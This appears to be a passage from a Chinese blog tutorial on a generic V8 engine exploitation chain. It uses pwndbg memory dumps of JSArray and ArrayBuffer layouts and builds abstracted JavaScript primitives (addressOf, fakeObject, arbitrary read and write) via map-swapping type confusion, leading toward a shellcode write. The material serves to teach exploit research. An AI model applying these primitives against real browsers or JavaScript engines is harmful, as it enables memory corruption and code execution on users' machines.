00 b1 04 04 08 </span><br><span class="line">+0030 0x3ea308085bd8  02 00 00 00 a9 5b 08 08  59 19 24 08 e9 06 04 08  </span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614113304860.png" alt="image-20250614113304860"></p>
<p>大致的内存结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |</span><br></pre></td></tr></table></figure>

<p>但这个结构体的 elements 就没有和 JS_OBJECT_TYPE 相邻了，因此一般不存在可利用的地方</p>
<h3 id="JSArray-c"><a href="#JSArray-c" class="headerlink" title="JSArray:c"></a>JSArray:c</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308085be1</span></span><br><span class="line">0x3ea308085be1: [JSArray]</span><br><span class="line"> - map: 0x3ea308241959 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3ea3082092dd &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3ea308085bd5 &lt;FixedArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x3ea3080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ea308180165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3ea308085bd5 &lt;FixedArray[1]&gt; &#123;</span><br><span class="line">           0: 0x3ea308085ba9 &lt;Object map = 0x3ea308244e01&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308085be1-1</span></span><br><span class="line">+0000 0x3ea308085be0  59 19 24 08 e9 06 04 08  d5 5b 08 08 02 00 00 00 </span><br><span class="line">+0010 0x3ea308085bf0  69 18 24 08 e9 06 04 08  65 00 21 08 06 00 00 00  </span><br><span class="line">+0020 0x3ea308085c00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 </span><br><span class="line">+0030 0x3ea308085c10  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  </span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308085bd5</span></span><br><span class="line">0x3ea308085bd5: [FixedArray]</span><br><span class="line"> - map: 0x3ea3080404b1 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x3ea308085ba9 &lt;Object map = 0x3ea308244e01&gt;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308085bd5-1</span></span><br><span class="line">+0000 0x3ea308085bd4  b1 04 04 08 02 00 00 00  a9 5b 08 08 59 19 24 08 </span><br><span class="line">+0010 0x3ea308085be4  e9 06 04 08 d5 5b 08 08  02 00 00 00 69 18 24 08  </span><br><span class="line">+0020 0x3ea308085bf4  e9 06 04 08 65 00 21 08  06 00 00 00 00 00 00 00 </span><br><span class="line">+0030 0x3ea308085c04  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614113724766.png" alt="image-20250614113724766"></p>
<p>同为 JSArray 实体，因此内存布局与变量 a 相同，但不同的是，由于 a 中存放的是 double 类型的浮点数，其 value 占用 64bit，而变量 c 中存放的是地址，由于地址压缩的缘故，其 value 只占用 32bit，但同样与 JSArray 结构体在内存上相邻。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit length          | 32bit value                        |elements</span><br><span class="line">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |jsarray</span><br></pre></td></tr></table></figure>

<h3 id="JSArray：d"><a href="#JSArray：d" class="headerlink" title="JSArray：d"></a>JSArray：d</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308085bf1</span></span><br><span class="line">0x3ea308085bf1: [JSArray]</span><br><span class="line"> - map: 0x3ea308241869 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3ea3082092dd &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3ea308210065 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3ea3080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ea308180165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3ea308210065 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308085bf1-1</span></span><br><span class="line">+0000 0x3ea308085bf0  69 18 24 08 e9 06 04 08  65 00 21 08 06 00 00 00 </span><br><span class="line">+0010 0x3ea308085c00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  </span><br><span class="line">... ↓            skipped 1 identical lines (16 bytes)</span><br><span class="line">+0030 0x3ea308085c20  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  </span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308210065</span></span><br><span class="line">0x3ea308210065: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x3ea3080404d9 &lt;Map&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308210065-1</span></span><br><span class="line">+0000 0x3ea308210064  d9 04 04 08 06 00 00 00  02 00 00 00 04 00 00 00  </span><br><span class="line">+0010 0x3ea308210074  06 00 00 00 c9 11 04 08  00 00 00 00 65 00 21 08 </span><br><span class="line">+0020 0x3ea308210084  89 04 04 08 00 00 00 00  b1 04 04 08 10 00 00 00  </span><br><span class="line">+0030 0x3ea308210094  41 00 21 08 61 53 04 08  1d 00 21 08 fd 53 04 08  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614114208300.png" alt="image-20250614114208300"></p>
<p>整数和浮点数数组没有什么差别，但它们在内存上不再相邻了，并且需要注意的是，其储存的数据也都被乘以二了，因此后续的利用中往往需要用浮点数去溢出，而不能直接了当的用整数数据溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit length          | 32bit value                        |elements</span><br><span class="line"></span><br><span class="line">不相邻</span><br><span class="line"></span><br><span class="line">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |jsarray</span><br></pre></td></tr></table></figure>



<h3 id="类型识别"><a href="#类型识别" class="headerlink" title="类型识别"></a>类型识别</h3><p>既然 a、c、d 三个变量都是 JSArray，肯定还需要一个结构用来区别其中储存的数据类型</p>
<p>我们尝试读取 a 和 d 两个数组的 map 结构体：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308241909</span></span><br><span class="line">0x3ea308241909: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3ea3082418e1 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3ea308180451 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3ea308209965 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - transitions #1: 0x3ea3082099b1 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x3ea308042f09 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3ea308241931 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3ea3082092dd &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3ea3082091b1 &lt;JSFunction Array (sfi = 0x3ea30818927d)&gt;</span><br><span class="line"> - dependent code: 0x3ea3080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308241869</span></span><br><span class="line">0x3ea308241869: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3ea30804030d &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x3ea308180451 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors #1: 0x3ea308209965 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - transitions #1: 0x3ea308209981 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x3ea308042f09 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x3ea3082418e1 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3ea3082092dd &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3ea3082091b1 &lt;JSFunction Array (sfi = 0x3ea30818927d)&gt;</span><br><span class="line"> - dependent code: 0x3ea3080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意到 map 结构体中存在一项成员用以标注 elements 类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- elements kind: PACKED_DOUBLE_ELEMENTS</span><br></pre></td></tr></table></figure>

<p>并且两个都是 JS_ARRAY_TYPE，大多数数据都是相同的，因此可以直接将一个变量的 map 地址赋给另外一个变量，使得在读取值时错误解析数据类型，也就是所谓的“类型混淆”</p>
<p>类型混淆是有可能造成地址泄露的，可以考虑这样的伪代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">float_arr= [2.1];</span><br><span class="line">obj_arr=[float_arr];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<p>正常访问 obj_arr[0] 会得到一个对象，但如果修改 obj_arr 的 map 为 float_arr 的 map，就会认为 obj_arr 是一个浮点数数组，那么此时访问 obj_arr[0] 就会得到对象 float_arr 的地址了</p>
<blockquote>
<p>注：对于没有接触过 Java 或 JavaScript 的读者来说可能会产生困惑，为什么需要通过这种麻烦的方式来获取地址，而不能像 C&#x2F;C++ 那样直接把对象地址打印出来？</p>
<p>简单来说，就是 JavaScript 不支持这种操作，它将一切视为对象或整数，消除了所谓“地址”的概念。 对 JavaScript 来说，例子中的 obj_arr[0] 储存的是一个 <strong>“对象”</strong> 而非 <strong>“地址”</strong>，访问该对象的返回值必然会是一个具体的 <strong>“对象”</strong>。(哪怕我们通过调试能够发现，它储存的就是一个地址，但在代码层面，我们没有获取该值的手段)</p>
</blockquote>
<h2 id="任意变量地址读"><a href="#任意变量地址读" class="headerlink" title="任意变量地址读"></a>任意变量地址读</h2><p>正如我们上一节所说，JavaScript 不允许我们直接读取某一个地址，但通过 “类型混淆” 的方法能够让 v8引擎 将一个地址误认为整数，并将其读出</p>
<h3 id="addressOf"><a href="#addressOf" class="headerlink" title="addressOf"></a>addressOf</h3><p>同上所述，我们讲这种类型混淆的读取地址方法称之为 “addressOf”</p>
<p>其一般的写法如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取某个变量的地址</span></span><br><span class="line"><span class="keyword">var</span> other=&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array=[other];</span><br><span class="line"><span class="keyword">var</span> double_array=[<span class="number">2.1</span>];</span><br><span class="line"><span class="keyword">var</span> double_array_map=double_array.<span class="title function_">getMap</span>();<span class="comment">//假设我们有办法获取到其 map 值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">target_var</span>)</span><br><span class="line">&#123;</span><br><span class="line">	obj_array[<span class="number">0</span>]=target_var;</span><br><span class="line">	obj_array.<span class="title function_">setMap</span>(double_array_map);<span class="comment">//设置其 map 为浮点数数组的 map</span></span><br><span class="line">	<span class="keyword">let</span> target_var_addr=<span class="title function_">float_to_int</span>(obj_array[<span class="number">0</span>]);<span class="comment">//读取obj_array[0]并将该浮点数转换为整型</span></span><br><span class="line">	<span class="keyword">return</span> target_var_addr;<span class="comment">//此处返回的是 target_var 的对象结构体地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象</p>
</blockquote>
<h3 id="fakeObject"><a href="#fakeObject" class="headerlink" title="fakeObject"></a>fakeObject</h3><p>与 addressOf 的步骤相反，将 float_arr 的 map 改为 obj_arr 的 map，使得在访问 float_arr[0] 时得到一个以 float_arr[0] 地址为起始的对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将某个地址转换为对象</span></span><br><span class="line"><span class="keyword">var</span> other=&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array=[other];</span><br><span class="line"><span class="keyword">var</span> double_array=[<span class="number">2.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map=obj_array.<span class="title function_">getMap</span>();<span class="comment">//假设我们有办法获取到其 map 值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObject</span>(<span class="params">target_addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">	double_array[<span class="number">0</span>]=<span class="title function_">int_to_float</span>(target_addr+<span class="number">1n</span>);<span class="comment">//将地址加一以区分对象和数值</span></span><br><span class="line">	double_array.<span class="title function_">setMap</span>(obj_array_map);</span><br><span class="line">	<span class="keyword">let</span> fake_obj=double_array[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该函数需要根据实际情况自行修改，示例代码仅做了一些逻辑抽象</p>
</blockquote>
<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>可以尝试构造出这样一个结构：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array=[double_array_map,<span class="title function_">int_to_float</span>(<span class="number">0x4141414141414141n</span>)];</span><br></pre></td></tr></table></figure>

<p>其在内存中的布局应为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| 32bit elements map | 32bit length | 64bit double_array_map | 64bit 0x4141414141414141 |element</span><br><span class="line">| 32bit fake_array map | 32bit properties | 32bit elements | 32bit length |JSArray</span><br></pre></td></tr></table></figure>

<p>接下来通过 addressOf 获取 fake_array 的地址，然后就能够计算出 double_array_map 的地址；再通过 fakeObject 将这个地址伪造成一个对象数组，对比下面的内存布局：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |JSArray</span><br></pre></td></tr></table></figure>

<p>此处的 fake_array[0] 成为了 JSArray 的 map 和 properties ，fake_array[1] 被当作了 elements addr 和 length，通过修改 fake_array[1] 就能够使该 elements 指向任意地址，再访问 fakeObject[0] 即可读取该地址处的数据了(此处 double_array_map 需要对应为一个 double 数组的 map)</p>
<p>代码逻辑大致如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array=[double_array_map,<span class="title function_">int_to_float</span>(<span class="number">0x4141414141414141n</span>)];<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64_addr</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">var</span> fake_array_addr=<span class="title function_">addressOf</span>(fake_array);</span><br><span class="line">	<span class="keyword">var</span> fake_object_addr=fake_array_addr-<span class="number">0x10n</span>;</span><br><span class="line">	<span class="keyword">var</span> fake_object=<span class="title function_">fakeObject</span>(fake_object_addr);</span><br><span class="line">	fake_array[<span class="number">1</span>]=<span class="title function_">int_to_float</span>(addr-<span class="number">8n</span>+<span class="number">1n</span>);</span><br><span class="line">	<span class="keyword">return</span> fake_object[<span class="number">0</span>];</span><br><span class="line">	</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>同上一小节一样，只需要将最后的 return 修改为写入即可：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array=[double_array_map,<span class="title function_">int_to_float</span>(<span class="number">0x4141414141414141n</span>)];<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64_addr</span>(<span class="params">addr,data</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">var</span> fake_array_addr=<span class="title function_">addressOf</span>(fake_array);</span><br><span class="line">	<span class="keyword">var</span> fake_object_addr=fake_array_addr-<span class="number">0x10n</span>;</span><br><span class="line">	<span class="keyword">var</span> fake_object=<span class="title function_">fakeObject</span>(fake_object_addr);</span><br><span class="line">	fake_array[<span class="number">1</span>]=<span class="title function_">int_to_float</span>(addr-<span class="number">8n</span>+<span class="number">1n</span>);</span><br><span class="line">	fake_object[<span class="number">0</span>]=data;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h2 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h2><p>参考了几篇其他师傅们所写的博客后，会发现目前所实现的任意地址写并不能正常工作，大致原因如下：</p>
<blockquote>
<ul>
<li>设置的 elements 地址为 addr-8n+1n，我们想要写 shellcode 的地址一般都是内存段在开头，那么更前面的内存空间则是未开辟的，写入时会因为访问未开辟的内存空间发生异常</li>
<li>另外一个原因是，在尝试写 d8 的 free_hook 或 malloc_hook 时，由于其地址都是以 0x7f 开头，而 Double 类型的浮点数在处理这些高地址时会将低20位置零，导致地址错误(这一点尚未确定，仅作记录)</li>
</ul>
</blockquote>
<p>因此直接性的写入不太能够成功，但间接性的方法或许还是存在的，如果向某个对象中写入数据不需要经过 map 和 length，或许就能够顺利完成了。</p>
<p>不过 JavaScript 还真的提供了这样的操作：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line">data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, <span class="number">2.0</span>, <span class="literal">true</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(data_buf);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(data_view);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x356708085ba9</span></span><br><span class="line">0x356708085ba9: [JSArrayBuffer]</span><br><span class="line"> - map: 0x356708241189 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x356708207929 &lt;Object map = 0x3567082411b1&gt;</span><br><span class="line"> - elements: 0x3567080406e9 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - backing_store: 0x5652a4bbfad0</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - detachable</span><br><span class="line"> - properties: 0x3567080406e9 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x356708085be1</span></span><br><span class="line">0x356708085be1: [JSDataView]</span><br><span class="line"> - map: 0x356708240c39 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x356708205c29 &lt;Object map = 0x356708240c61&gt;</span><br><span class="line"> - elements: 0x3567080406e9 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer =0x356708085ba9 &lt;ArrayBuffer map = 0x356708241189&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - properties: 0x3567080406e9 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line">    0, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x356708085ba9-1</span></span><br><span class="line">+0000 0x356708085ba8  89 11 24 08 e9 06 04 08  e9 06 04 08 10 00 00 00 </span><br><span class="line">+0010 0x356708085bb8  00 00 00 00 d0 fa bb a4  52 56 00 00 f0 fa bb a4 </span><br><span class="line">+0020 0x356708085bc8  52 56 00 00 02 00 00 00  00 00 00 00 00 00 00 00  </span><br><span class="line">+0030 0x356708085bd8  00 00 00 00 00 00 00 00  39 0c 24 08 e9 06 04 08  </span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">+0040 0x356708085be8  e9 06 04 08 a9 5b 08 08  00 00 00 00 00 00 00 00</span>  </span><br><span class="line">+0050 0x356708085bf8  10 00 00 00 00 00 00 00  d0 fa bb a4 52 56 00 00  </span><br><span class="line">+0060 0x356708085c08  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  </span><br><span class="line">+0070 0x356708085c18  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x5652a4bbfad0</span></span><br><span class="line">+0000 0x5652a4bbfad0  00 00 00 00 00 00 00 40  00 00 00 00 00 00 00 00 </span><br><span class="line">+0010 0x5652a4bbfae0  00 00 00 00 00 00 00 00  31 00 00 00 00 00 00 00  </span><br><span class="line">+0020 0x5652a4bbfaf0  00 00 06 4c 2e 7f 00 00  60 bd c5 a4 52 56 00 00 </span><br><span class="line">+0030 0x5652a4bbfb00  60 03 bc a4 52 56 00 00  00 00 00 00 00 00 00 00</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x5652a4bbfad0</span></span><br><span class="line">00:0000│  0x5652a4bbfad0 ◂— 0x4000000000000000</span><br><span class="line">01:0008│  0x5652a4bbfad8 ◂— 0</span><br><span class="line">02:0010│  0x5652a4bbfae0 ◂— 0</span><br><span class="line">03:0018│  0x5652a4bbfae8 ◂— 0x31 /* &#x27;1&#x27; */</span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614153712277.png" alt="image-20250614153712277"></p>
